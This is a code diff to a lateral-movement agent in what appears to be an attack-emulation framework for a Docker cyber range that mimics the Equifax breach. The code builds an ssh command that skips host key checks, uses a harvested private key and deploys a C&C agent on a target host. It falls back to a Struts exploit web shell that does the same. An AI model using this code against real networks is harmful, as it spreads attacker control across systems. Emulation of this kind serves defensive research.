@@ -17,9 +17,10 @@ class LateralMoveAgent(BaseAgent):
     Needs the CncService (the C&C server) in addition to the env state service.
     """
 
-    def __init__(self, env_service, cnc):
+    def __init__(self, env_service, cnc, docker_extnet: str = "equifax-seg_extnet"):
         super().__init__(env_service)
         self.cnc = cnc
+        self.docker_extnet = docker_extnet
 
     def run(
         self,
@@ -46,7 +47,7 @@ class LateralMoveAgent(BaseAgent):
                         group, **({"server_url": caldera_server_url} if caldera_server_url else {})
                     )
                     ssh_cmd = (
-                        f"ssh -o StrictHostKeyChecking=no -i /opt/tomcat/.ssh/id_rsa "
+                        f"ssh -o StrictHostKeyChecking=no -i ~/.ssh/id_rsa "
                         f"{credential.username}@{target_host} '{deploy_cmd}'"
                     )
                     pivot_runner.run(ssh_cmd)
@@ -60,7 +61,7 @@ class LateralMoveAgent(BaseAgent):
                     access.run(self.cnc.agent_deploy_command(group))
                     method = f"ssh as {credential.username}"
             else:
-                access = WebShell(rhost=target_host)
+                access = WebShell(rhost=target_host, docker_network=self.docker_extnet)
                 method = "struts exploit"
                 access.run(self.cnc.agent_deploy_command(group))
 
